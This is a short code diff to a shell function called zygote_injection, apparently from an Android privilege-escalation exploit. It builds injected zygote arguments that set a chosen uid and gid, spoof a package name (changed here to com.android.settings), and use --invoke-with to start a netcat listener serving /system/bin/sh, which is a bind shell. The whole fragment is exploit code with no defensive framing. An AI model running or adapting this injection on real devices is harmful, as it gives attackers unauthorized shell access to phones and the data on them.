@@ -110,17 +110,15 @@ zygote_injection() {
 --runtime-args
 --setuid=%s
 --setgid=%s
---runtime-flags=2049
---mount-external-full
---target-sdk-version=28
+--runtime-flags=0
+--target-sdk-version=29
 --setgroups=3003
 --nice-name=runnetcat
---seinfo=platform:isSystemServer:privapp:targetSdkVersion=28:complete
 --invoke-with
 toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
 --instruction-set=arm
 --app-data-dir=/data/
---package-name=com.qualcomm.qti.qms.service.trustzoneaccess
+--package-name=com.android.settings
 android.app.ActivityThread
 "\n' "$uid" "$uid" "$NC_PORT"
 }
